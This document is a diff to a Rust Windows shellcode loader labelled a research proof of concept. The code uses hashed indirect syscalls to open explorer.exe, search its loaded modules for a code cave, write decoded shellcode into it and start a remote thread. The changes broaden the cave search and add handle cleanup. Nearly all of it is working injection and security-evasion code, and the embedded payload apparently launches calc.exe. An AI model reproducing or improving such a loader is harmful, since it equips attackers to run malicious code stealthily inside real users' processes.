@@ -10,7 +10,7 @@ use windows_sys::Win32::Foundation::*;
 
 /*
     ================================================================================
-    2026 ULTIMATE STEALTH LOADER - PERFORMANCE & ROBUSTNESS OPTIMIZED
+    ULTIMATE 2026 RESEARCH PoC: ROBUST REMOTE MODULE STOMPING & INDIRECT SYSCALLS
     ================================================================================
 */
 
@@ -121,7 +121,7 @@ unsafe fn find_ssn_and_gadget(ntdll: *mut c_void, h: u32) -> Option<(u32, usize)
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[*] Final 2026 Stealth Loader Refined PoC");
-    let payload_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
+    let payload_b64 = "/EiD5PDozAAAAEFRQVBSU1pIidpmaEiLUmBJi1IYSItSIPpI81BJi0pMTT1JSIHArDxhfAIsIEHB6Q1BAcHifVJBX0iLUmCLQjxIAXCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSgHQ41ZI/8lBiTSISEEB1DgsKHXxtANMJAglOdFYWEGLNCBJAUDmQYtMSBFA0EGLBIdIAXDQAVhBWF5ZWmFbWVlIidwgUlL+4FhBWVpIixLpV////11IugEAAAAAAAAAVUiNjQEBQEe6MYtvh//Vu7C1olZBuqaVvW3/1UgDxCg8BnYKiPvgeQW7RxNyNm8AWUf91WNhbGMuZXhlAA==";
     let shellcode = general_purpose::STANDARD.decode(payload_b64)?;
 
     unsafe {
@@ -134,8 +134,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let (ssn_thread, _) = find_ssn_and_gadget(ntdll, dbj2("NtCreateThreadEx")).expect("thread ssn failed");
         let (ssn_query, _) = find_ssn_and_gadget(ntdll, dbj2("NtQuerySystemInformation")).expect("query ssn failed");
         let (ssn_proc, _) = find_ssn_and_gadget(ntdll, dbj2("NtQueryInformationProcess")).expect("proc ssn failed");
+        let (ssn_close, _) = find_ssn_and_gadget(ntdll, dbj2("NtClose")).expect("close ssn failed");
 
-        // 1. Find Explorer PID
+        println!("[*] Locating explorer.exe...");
         let mut buffer = vec![0u8; 1024 * 1024];
         let mut len = 0u32;
         let mut st = sys_call(ssn_query, gadget, 5, buffer.as_mut_ptr() as usize, buffer.len(), &mut len as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
@@ -155,14 +156,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         if exp_pid.is_null() { return Err("explorer.exe not found".into()); }
         println!("[+] Target found: PID {}", exp_pid as usize);
 
-        // 2. Open Explorer
+        println!("[*] Opening target process handle...");
         let mut h_proc: HANDLE = null_mut();
         let mut oa = OBJECT_ATTRIBUTES { Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32, RootDirectory: null_mut(), ObjectName: null_mut(), Attributes: 0, SecurityDescriptor: null_mut(), SecurityQualityOfService: null_mut() };
         let mut cid = CLIENT_ID { UniqueProcess: exp_pid, UniqueThread: null_mut() };
         st = sys_call(ssn_open, gadget, &mut h_proc as *mut _ as usize, 0x1FFFFF, &mut oa as *mut _ as usize, &mut cid as *mut _ as usize, 0, 0, 0, 0, 0, 0, 0);
         if st != 0 || h_proc.is_null() { return Err(format!("Open failed: 0x{:x}", st).into()); }
 
-        // 3. Remote Module Cave Discovery
+        println!("[*] Reading remote PEB...");
         let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
         sys_call(ssn_proc, gadget, h_proc as usize, 0, &mut pbi as *mut _ as usize, std::mem::size_of::<PROCESS_BASIC_INFORMATION>(), 0, 0, 0, 0, 0, 0, 0);
         let mut peb_copy: PEB = std::mem::zeroed();
@@ -175,7 +176,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         println!("[*] Searching for code cave in explorer.exe...");
 
         let mut module_count = 0;
-        while curr_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY && module_count < 50 {
+        while curr_link != (peb_copy.Ldr as usize + 16) as *mut LIST_ENTRY && module_count < 100 {
             module_count += 1;
             let mut entry: LDR_DATA_TABLE_ENTRY = std::mem::zeroed();
             sys_call(ssn_read, gadget, h_proc as usize, curr_link as usize, &mut entry as *mut _ as usize, std::mem::size_of::<LDR_DATA_TABLE_ENTRY>(), 0, 0, 0, 0, 0, 0, 0);
@@ -185,37 +186,47 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 sys_call(ssn_read, gadget, h_proc as usize, entry.BaseDllName.Buffer as usize, n_buf.as_mut_ptr() as usize, entry.BaseDllName.Length as usize, 0, 0, 0, 0, 0, 0, 0);
                 let name = String::from_utf16_lossy(&n_buf).to_lowercase();
 
-                if !name.contains("ntdll") && !name.contains("kernel") && !name.contains("gdi") && !name.contains("user32") {
+                if !name.contains("ntdll") && !name.contains("kernel") {
                     let mut dos: IMAGE_DOS_HEADER = std::mem::zeroed();
                     sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize, &mut dos as *mut _ as usize, std::mem::size_of::<IMAGE_DOS_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
-                    let mut nt: IMAGE_NT_HEADERS64 = std::mem::zeroed();
-                    sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize + dos.e_lfanew as usize, &mut nt as *mut _ as usize, std::mem::size_of::<IMAGE_NT_HEADERS64>(), 0, 0, 0, 0, 0, 0, 0);
-                    let s_base = entry.DllBase as usize + dos.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>();
-                    for i in 0..nt.FileHeader.NumberOfSections {
-                        let mut s: IMAGE_SECTION_HEADER = std::mem::zeroed();
-                        sys_call(ssn_read, gadget, h_proc as usize, s_base + (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>()), &mut s as *mut _ as usize, std::mem::size_of::<IMAGE_SECTION_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
-                        if s.Name[0] == b'.' && s.Name[1] == b't' {
-                            let start = entry.DllBase as usize + s.VirtualAddress as usize;
-                            let size = s.Misc.VirtualSize as usize;
-                            let search_len = if size > 4096 { 4096 } else { size };
-                            let search_start = start + size - search_len;
-                            let mut t_buf = vec![0u8; search_len];
-                            sys_call(ssn_read, gadget, h_proc as usize, search_start, t_buf.as_mut_ptr() as usize, search_len, 0, 0, 0, 0, 0, 0, 0);
-                            let mut count = 0;
-                            for j in (0..search_len).rev() {
-                                if t_buf[j] == 0x00 || t_buf[j] == 0xCC { count += 1; } else { count = 0; }
-                                if count >= shellcode.len() { cave_addr = search_start + j; break; }
+
+                    if dos.e_magic == 0x5A4D {
+                        let mut nt: IMAGE_NT_HEADERS64 = std::mem::zeroed();
+                        sys_call(ssn_read, gadget, h_proc as usize, entry.DllBase as usize + dos.e_lfanew as usize, &mut nt as *mut _ as usize, std::mem::size_of::<IMAGE_NT_HEADERS64>(), 0, 0, 0, 0, 0, 0, 0);
+
+                        let s_base = entry.DllBase as usize + dos.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>();
+                        for i in 0..nt.FileHeader.NumberOfSections {
+                            let mut s: IMAGE_SECTION_HEADER = std::mem::zeroed();
+                            sys_call(ssn_read, gadget, h_proc as usize, s_base + (i as usize * std::mem::size_of::<IMAGE_SECTION_HEADER>()), &mut s as *mut _ as usize, std::mem::size_of::<IMAGE_SECTION_HEADER>(), 0, 0, 0, 0, 0, 0, 0);
+
+                            if (s.Name[0] == b'.' && s.Name[1] == b't' && s.Name[2] == b'e') || (s.Name[0] == b'.' && s.Name[1] == b'r' && s.Name[2] == b'd') {
+                                let start = entry.DllBase as usize + s.VirtualAddress as usize;
+                                let size = s.Misc.VirtualSize as usize;
+                                let search_len = if size > 65536 { 65536 } else { size };
+                                let search_start = start + size - search_len;
+                                let mut t_buf = vec![0u8; search_len];
+                                sys_call(ssn_read, gadget, h_proc as usize, search_start, t_buf.as_mut_ptr() as usize, search_len, 0, 0, 0, 0, 0, 0, 0);
+
+                                let mut count = 0;
+                                for j in (0..search_len).rev() {
+                                    if t_buf[j] == 0x00 || t_buf[j] == 0xCC { count += 1; } else { count = 0; }
+                                    if count >= shellcode.len() {
+                                        cave_addr = search_start + j;
+                                        println!("[+] Suitable cave found in module {} at 0x{:x}", name, cave_addr);
+                                        break;
+                                    }
+                                }
                             }
+                            if cave_addr != 0 { break; }
                         }
-                        if cave_addr != 0 { break; }
                     }
                 }
             }
             if cave_addr != 0 { break; }
             curr_link = entry.InLoadOrderLinks.Flink;
         }
-        if cave_addr == 0 { return Err("Cave failure".into()); }
-        println!("[+] Found Cave: 0x{:x}", cave_addr);
+
+        if cave_addr == 0 { return Err("Cave failure - no suitable area found.".into()); }
 
         // 4. Stomp & Exec
         let mut base = cave_addr as *mut c_void;
@@ -225,12 +236,18 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         sys_call(ssn_write, gadget, h_proc as usize, cave_addr, shellcode.as_ptr() as usize, shellcode.len(), 0, 0, 0, 0, 0, 0, 0);
         sys_call(ssn_protect, gadget, h_proc as usize, &mut base as *mut _ as usize, &mut sz as *mut _ as usize, PAGE_EXECUTE_READ as usize, &mut old as *mut _ as usize, 0, 0, 0, 0, 0, 0);
 
+        println!("[*] Triggering shellcode in explorer.exe...");
         let mut h_th: HANDLE = null_mut();
         st = sys_call(ssn_thread, gadget, &mut h_th as *mut _ as usize, 0x1FFFFF, 0, h_proc as usize, cave_addr, 0, 0, 0, 0, 0, 0);
+
+        // Cleanup
+        sys_call(ssn_close, gadget, h_proc as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+
         if st == 0 && !h_th.is_null() {
-            println!("[+] Stealth Execution successfully triggered.");
+            println!("[+] Injection cycle complete. Verify execution.");
+            sys_call(ssn_close, gadget, h_th as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         } else {
-            println!("[-] Trigger failed: 0x{:x}", st);
+            println!("[-] Thread trigger failed: 0x{:x}", st);
         }
     }
     Ok(())
